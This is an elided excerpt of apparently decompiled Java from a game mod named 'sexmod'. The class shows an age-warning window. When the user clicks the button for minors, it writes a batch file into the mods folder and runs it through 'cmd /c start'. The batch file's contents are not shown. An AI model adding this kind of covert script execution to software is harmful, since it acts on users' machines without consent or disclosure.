...
public class PornWarningHelper extends JFrame {
   private JPanel c;
   static PornWarningHelper b;
   public static boolean a = true;

   public static void showWarningWindow() {
      EventQueue.invokeLater(() -> {
         try {
            b = new PornWarningHelper();
            b.setVisible(true);
            b.requestFocus();
   ...
   public PornWarningHelper() {
      ...
      jButton.addActionListener(arg1 -> {
         a = false;
      ...
      jButton2.addActionListener(arg1b -> {
         a = false;
         System.out.println("MINOR!!! WHEOO WOOO WHEEE WHOOO WHEEE WHOO");
         File file3 = new File("sexmod");
         ...
         File file4 = new File("mods/youCanJustDeleteMe.bat");
         ...
         try {
            ...
            fileWriter.close();
            Runtime.getRuntime().exec("cmd /c start " + file4.getPath());
